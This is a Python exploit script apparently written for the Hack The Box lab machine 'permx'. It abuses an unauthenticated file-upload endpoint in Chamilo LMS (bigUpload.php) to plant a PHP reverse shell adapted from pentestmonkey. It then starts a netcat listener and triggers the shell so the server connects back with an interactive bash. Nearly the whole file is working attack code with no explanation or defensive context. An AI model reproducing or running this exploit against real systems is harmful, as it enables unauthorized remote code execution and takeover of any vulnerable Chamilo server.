#!/usr/bin/python
import argparse
import requests
import subprocess


parser = argparse.ArgumentParser(description='usage: python exploit.py <LOCAL_ADDRESS> <PORT>')
parser.add_argument('address')
parser.add_argument('port')
args = parser.parse_args()
address = args.address
port = args.port
#defining variables that should be changed
url = "http://lms.permx.htb"
upload_path = "/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported"
shell_path = "/main/inc/lib/javascript/bigupload/files/cmd.php"

#creating a php webshell file
#CODE USED FROM PENTESTMONKEY
php_code = """
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = $_REQUEST['ip']; 
$port = $_REQUEST['port'];
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /usr/bin/bash -i';
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}
chdir("/");
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>"""

file = open("cmd.php","w")
with open("cmd.php","w") as file:
	file.write(php_code)
	
#uploading the file
with open("cmd.php","rb") as file:
        r1 = requests.post(f"{url}{upload_path}",files={"bigUploadFile":file})
	
if "successfully" in r1.text:
	print("The file is uploaded, here is your reverse shell")
	#executing the command
	print()
	try:
		listener = subprocess.Popen(["nc", "-lvnp", port])
		r2 = requests.get(f"{url+shell_path}?ip={address}&port={port}")
		print(r2.text)
		listener.wait()
	except KeyboardInterrupt:
		listener.terminate()
		listener.wait()
		print()
		print("You exited the shell")
else:
	print("there is an error, check if the /files/ directory exists in the application")
	quit()
